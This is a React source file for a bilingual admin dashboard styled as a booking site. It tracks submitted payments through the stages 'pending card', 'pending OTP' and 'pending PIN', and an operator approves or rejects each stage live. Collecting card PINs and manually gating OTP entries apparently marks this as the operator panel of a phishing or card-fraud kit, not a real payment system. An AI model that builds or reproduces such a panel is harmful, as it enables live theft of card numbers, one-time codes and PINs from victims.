import { useState, useEffect } from 'react';
import Header from '@/components/Header';
import { BarChart, Bar, LineChart, Line, XAxis, YAxis, CartesianGrid, Tooltip, Legend, ResponsiveContainer, PieChart, Pie, Cell } from 'recharts';
import { Search, Download, Filter, Eye, EyeOff, CheckCircle, XCircle, Clock, AlertCircle } from 'lucide-react';

interface Payment {
  id: string;
  email: string;
  cardNumber: string;
  cardHolder: string;
  status: 'pending_card' | 'pending_otp' | 'pending_pin' | 'completed' | 'rejected';
  createdAt: string;
}

interface DashboardStats {
  totalBookings: number;
  completed: number;
  pending: number;
  rejected: number;
  revenue: number;
}

export default function AdminDashboard() {
  const [language, setLanguage] = useState<'en' | 'es'>('en');
  const [payments, setPayments] = useState<Payment[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedPayment, setSelectedPayment] = useState<Payment | null>(null);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterStatus, setFilterStatus] = useState<string>('all');
  const [stats, setStats] = useState<DashboardStats>({
    totalBookings: 0,
    completed: 0,
    pending: 0,
    rejected: 0,
    revenue: 0,
  });

  const translations = {
    en: {
      adminDashboard: 'Admin Dashboard',
      totalBookings: 'Total Bookings',
      completed: 'Completed',
      pending: 'Pending',
      rejected: 'Rejected',
      revenue: 'Revenue',
      pendingPayments: 'Pending Payments',
      email: 'Email',
      cardNumber: 'Card Number',
      status: 'Status',
      action: 'Action',
      approve: 'Approve',
      reject: 'Reject',
      noPayments: 'No pending payments',
      details: 'Payment Details',
      cardHolder: 'Card Holder',
      createdAt: 'Created At',
      close: 'Close',
      search: 'Search by email...',
      filter: 'Filter by status',
      export: 'Export Data',
      statistics: 'Statistics',
      recentActivity: 'Recent Activity',
      bookingTrend: 'Booking Trend',
      statusDistribution: 'Status Distribution',
      allStatuses: 'All Statuses',
      pendingCard: 'Pending Card',
      pendingOTP: 'Pending OTP',
      pendingPIN: 'Pending PIN',
      viewDetails: 'View Details',
    },
    es: {
      adminDashboard: 'Panel de Administración',
      totalBookings: 'Total de Reservas',
      completed: 'Completadas',
      pending: 'Pendientes',
      rejected: 'Rechazadas',
      revenue: 'Ingresos',
      pendingPayments: 'Pagos Pendientes',
      email: 'Correo',
      cardNumber: 'Número de Tarjeta',
      status: 'Estado',
      action: 'Acción',
      approve: 'Aprobar',
      reject: 'Rechazar',
      noPayments: 'No hay pagos pendientes',
      details: 'Detalles del Pago',
      cardHolder: 'Titular de la Tarjeta',
      createdAt: 'Creado en',
      close: 'Cerrar',
      search: 'Buscar por correo...',
      filter: 'Filtrar por estado',
      export: 'Exportar Datos',
      statistics: 'Estadísticas',
      recentActivity: 'Actividad Reciente',
      bookingTrend: 'Tendencia de Reservas',
      statusDistribution: 'Distribución de Estados',
      allStatuses: 'Todos los Estados',
      pendingCard: 'Tarjeta Pendiente',
      pendingOTP: 'OTP Pendiente',
      pendingPIN: 'PIN Pendiente',
      viewDetails: 'Ver Detalles',
    },
  };

  const t = translations[language];

  useEffect(() => {
    fetchPayments();
    const interval = setInterval(fetchPayments, 5000);
    return () => clearInterval(interval);
  }, []);

  const fetchPayments = async () => {
    try {
      const response = await fetch('/api/admin/payments');
      if (response.ok) {
        const data = await response.json();
        setPayments(data);
        updateStats(data);
      }
    } catch (error) {
      console.error('Error fetching payments:', error);
    } finally {
      setLoading(false);
    }
  };

  const updateStats = (data: Payment[]) => {
    const completed = data.filter(p => p.status === 'completed').length;
    const pending = data.filter(p => 
      p.status === 'pending_card' || p.status === 'pending_otp' || p.status === 'pending_pin'
    ).length;
    const rejected = data.filter(p => p.status === 'rejected').length;

    setStats({
      totalBookings: data.length,
      completed,
      pending,
      rejected,
      revenue: completed * 100, // Placeholder calculation
    });
  };

  const handleApprove = async (paymentId: string) => {
    try {
      const response = await fetch(`/api/admin/payments/${paymentId}/approve`, {
        method: 'POST',
      });
      if (response.ok) {
        fetchPayments();
      }
    } catch (error) {
      console.error('Error approving payment:', error);
    }
  };

  const handleReject = async (paymentId: string) => {
    try {
      const response = await fetch(`/api/admin/payments/${paymentId}/reject`, {
        method: 'POST',
      });
      if (response.ok) {
        fetchPayments();
      }
    } catch (error) {
      console.error('Error rejecting payment:', error);
    }
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'pending_card':
        return 'bg-yellow-100 text-yellow-800 border-yellow-300';
      case 'pending_otp':
        return 'bg-blue-100 text-blue-800 border-blue-300';
      case 'pending_pin':
        return 'bg-purple-100 text-purple-800 border-purple-300';
      case 'completed':
        return 'bg-green-100 text-green-800 border-green-300';
      case 'rejected':
        return 'bg-red-100 text-red-800 border-red-300';
      default:
        return 'bg-gray-100 text-gray-800 border-gray-300';
    }
  };

  const getStatusIcon = (status: string) => {
    switch (status) {
      case 'completed':
        return <CheckCircle className="w-5 h-5" />;
      case 'rejected':
        return <XCircle className="w-5 h-5" />;
      case 'pending_card':
      case 'pending_otp':
      case 'pending_pin':
        return <Clock className="w-5 h-5" />;
      default:
        return <AlertCircle className="w-5 h-5" />;
    }
  };

  const getStatusLabel = (status: string) => {
    const statusLabels = {
      en: {
        pending_card: 'Pending Card',
        pending_otp: 'Pending OTP',
        pending_pin: 'Pending PIN',
        completed: 'Completed',
        rejected: 'Rejected',
      },
      es: {
        pending_card: 'Tarjeta Pendiente',
        pending_otp: 'OTP Pendiente',
        pending_pin: 'PIN Pendiente',
        completed: 'Completado',
        rejected: 'Rechazado',
      },
    };
    return statusLabels[language][status as keyof typeof statusLabels['en']] || status;
  };

  const filteredPayments = payments.filter(payment => {
    const matchesSearch = payment.email.toLowerCase().includes(searchTerm.toLowerCase());
    const matchesFilter = filterStatus === 'all' || payment.status === filterStatus;
    return matchesSearch && matchesFilter;
  });

  const chartData = [
    { name: 'Mon', bookings: 15, completed: 12 },
    { name: 'Tue', bookings: 18, completed: 14 },
    { name: 'Wed', bookings: 22, completed: 18 },
    { name: 'Thu', bookings: 25, completed: 20 },
    { name: 'Fri', bookings: 28, completed: 24 },
    { name: 'Sat', bookings: 32, completed: 28 },
    { name: 'Sun', bookings: 20, completed: 18 },
  ];

  const statusData = [
    { name: 'Completed', value: stats.completed, color: '#10b981' },
    { name: 'Pending', value: stats.pending, color: '#f59e0b' },
    { name: 'Rejected', value: stats.rejected, color: '#ef4444' },
  ];

  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-br from-gray-50 to-gray-100">
      <Header language={language} onLanguageChange={setLanguage} />

      <main className="flex-1 py-8 px-4">
        <div className="max-w-7xl mx-auto">
          {/* Header */}
          <div className="mb-8">
            <h1 className="text-4xl font-bold text-gray-900 mb-2">{t.adminDashboard}</h1>
            <p className="text-gray-600">{language === 'en' ? 'Welcome back! Here\'s your booking overview.' : 'Bienvenido de vuelta! Aquí está tu resumen de reservas.'}</p>
          </div>

          {/* Statistics Cards */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-6 mb-8">
            <div className="bg-white rounded-lg shadow-md p-6 border-l-4 border-blue-500">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-600 text-sm font-medium">{t.totalBookings}</p>
                  <p className="text-3xl font-bold text-gray-900 mt-2">{stats.totalBookings}</p>
                </div>
                <div className="bg-blue-100 p-3 rounded-lg">
                  <AlertCircle className="w-6 h-6 text-blue-600" />
                </div>
              </div>
            </div>

            <div className="bg-white rounded-lg shadow-md p-6 border-l-4 border-green-500">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-600 text-sm font-medium">{t.completed}</p>
                  <p className="text-3xl font-bold text-gray-900 mt-2">{stats.completed}</p>
                </div>
                <div className="bg-green-100 p-3 rounded-lg">
                  <CheckCircle className="w-6 h-6 text-green-600" />
                </div>
              </div>
            </div>

            <div className="bg-white rounded-lg shadow-md p-6 border-l-4 border-yellow-500">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-600 text-sm font-medium">{t.pending}</p>
                  <p className="text-3xl font-bold text-gray-900 mt-2">{stats.pending}</p>
                </div>
                <div className="bg-yellow-100 p-3 rounded-lg">
                  <Clock className="w-6 h-6 text-yellow-600" />
                </div>
              </div>
            </div>

            <div className="bg-white rounded-lg shadow-md p-6 border-l-4 border-red-500">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-600 text-sm font-medium">{t.rejected}</p>
                  <p className="text-3xl font-bold text-gray-900 mt-2">{stats.rejected}</p>
                </div>
                <div className="bg-red-100 p-3 rounded-lg">
                  <XCircle className="w-6 h-6 text-red-600" />
                </div>
              </div>
            </div>

            <div className="bg-white rounded-lg shadow-md p-6 border-l-4 border-purple-500">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-600 text-sm font-medium">{t.revenue}</p>
                  <p className="text-3xl font-bold text-gray-900 mt-2">${stats.revenue}</p>
                </div>
                <div className="bg-purple-100 p-3 rounded-lg">
                  <Download className="w-6 h-6 text-purple-600" />
                </div>
              </div>
            </div>
          </div>

          {/* Charts */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-8">
            {/* Booking Trend Chart */}
            <div className="lg:col-span-2 bg-white rounded-lg shadow-md p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-4">{t.bookingTrend}</h2>
              <ResponsiveContainer width="100%" height={300}>
                <LineChart data={chartData}>
                  <CartesianGrid strokeDasharray="3 3" />
                  <XAxis dataKey="name" />
                  <YAxis />
                  <Tooltip />
                  <Legend />
                  <Line type="monotone" dataKey="bookings" stroke="#3b82f6" strokeWidth={2} />
                  <Line type="monotone" dataKey="completed" stroke="#10b981" strokeWidth={2} />
                </LineChart>
              </ResponsiveContainer>
            </div>

            {/* Status Distribution Pie Chart */}
            <div className="bg-white rounded-lg shadow-md p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-4">{t.statusDistribution}</h2>
              <ResponsiveContainer width="100%" height={300}>
                <PieChart>
                  <Pie
                    data={statusData}
                    cx="50%"
                    cy="50%"
                    labelLine={false}
                    label={({ name, value }) => `${name}: ${value}`}
                    outerRadius={80}
                    fill="#8884d8"
                    dataKey="value"
                  >
                    {statusData.map((entry, index) => (
                      <Cell key={`cell-${index}`} fill={entry.color} />
                    ))}
                  </Pie>
                  <Tooltip />
                </PieChart>
              </ResponsiveContainer>
            </div>
          </div>

          {/* Search and Filter */}
          <div className="bg-white rounded-lg shadow-md p-6 mb-8">
            <div className="flex flex-col md:flex-row gap-4 mb-6">
              <div className="flex-1 relative">
                <Search className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                <input
                  type="text"
                  placeholder={t.search}
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="w-full pl-10 pr-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
              <div className="flex items-center gap-2">
                <Filter className="w-5 h-5 text-gray-400" />
                <select
                  value={filterStatus}
                  onChange={(e) => setFilterStatus(e.target.value)}
                  className="px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                >
                  <option value="all">{t.allStatuses}</option>
                  <option value="pending_card">{t.pendingCard}</option>
                  <option value="pending_otp">{t.pendingOTP}</option>
                  <option value="pending_pin">{t.pendingPIN}</option>
                  <option value="completed">{t.completed}</option>
                  <option value="rejected">{t.rejected}</option>
                </select>
              </div>
            </div>

            {/* Payments Table */}
            {loading ? (
              <div className="text-center py-12">
                <p className="text-gray-600">{language === 'en' ? 'Loading...' : 'Cargando...'}</p>
              </div>
            ) : filteredPayments.length === 0 ? (
              <div className="text-center py-12">
                <p className="text-gray-600 text-lg">{t.noPayments}</p>
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead className="bg-gray-50 border-b">
                    <tr>
                      <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">{t.email}</th>
                      <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">{t.cardNumber}</th>
                      <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">{t.status}</th>
                      <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">{t.createdAt}</th>
                      <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">{t.action}</th>
                    </tr>
                  </thead>
                  <tbody>
                    {filteredPayments.map((payment) => (
                      <tr key={payment.id} className="border-b hover:bg-gray-50 transition">
                        <td className="px-6 py-4 text-sm text-gray-700">{payment.email}</td>
                        <td className="px-6 py-4 text-sm text-gray-700">
                          {payment.cardNumber.slice(-4).padStart(payment.cardNumber.length, '*')}
                        </td>
                        <td className="px-6 py-4 text-sm">
                          <span className={`inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-semibold border ${getStatusColor(payment.status)}`}>
                            {getStatusIcon(payment.status)}
                            {getStatusLabel(payment.status)}
                          </span>
                        </td>
                        <td className="px-6 py-4 text-sm text-gray-700">
                          {new Date(payment.createdAt).toLocaleDateString()}
                        </td>
                        <td className="px-6 py-4 text-sm space-x-2">
                          {payment.status !== 'completed' && payment.status !== 'rejected' && (
                            <>
                              <button
                                onClick={() => handleApprove(payment.id)}
                                className="inline-block bg-green-600 hover:bg-green-700 text-white font-semibold py-1 px-3 rounded transition text-xs"
                              >
                                {t.approve}
                              </button>
                              <button
                                onClick={() => handleReject(payment.id)}
                                className="inline-block bg-red-600 hover:bg-red-700 text-white font-semibold py-1 px-3 rounded transition text-xs"
                              >
                                {t.reject}
                              </button>
                            </>
                          )}
                          <button
                            onClick={() => setSelectedPayment(payment)}
                            className="inline-block bg-blue-600 hover:bg-blue-700 text-white font-semibold py-1 px-3 rounded transition text-xs"
                          >
                            {t.viewDetails}
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        </div>
      </main>

      {/* Details Modal */}
      {selectedPayment && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-lg shadow-lg p-8 max-w-md w-full">
            <h2 className="text-2xl font-bold mb-6 text-gray-800">{t.details}</h2>

            <div className="space-y-4 mb-8">
              <div>
                <p className="text-sm text-gray-600">{t.email}</p>
                <p className="text-lg font-semibold text-gray-800">{selectedPayment.email}</p>
              </div>

              <div>
                <p className="text-sm text-gray-600">{t.cardHolder}</p>
                <p className="text-lg font-semibold text-gray-800">{selectedPayment.cardHolder}</p>
              </div>

              <div>
                <p className="text-sm text-gray-600">{t.cardNumber}</p>
                <p className="text-lg font-semibold text-gray-800">
                  {selectedPayment.cardNumber.slice(-4).padStart(selectedPayment.cardNumber.length, '*')}
                </p>
              </div>

              <div>
                <p className="text-sm text-gray-600">{t.status}</p>
                <p className={`text-lg font-semibold px-3 py-1 rounded-full inline-block ${getStatusColor(selectedPayment.status)}`}>
                  {getStatusLabel(selectedPayment.status)}
                </p>
              </div>

              <div>
                <p className="text-sm text-gray-600">{t.createdAt}</p>
                <p className="text-lg font-semibold text-gray-800">
                  {new Date(selectedPayment.createdAt).toLocaleString()}
                </p>
              </div>
            </div>

            <button
              onClick={() => setSelectedPayment(null)}
              className="w-full bg-gray-600 hover:bg-gray-700 text-white font-bold py-2 rounded-lg transition"
            >
              {t.close}
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
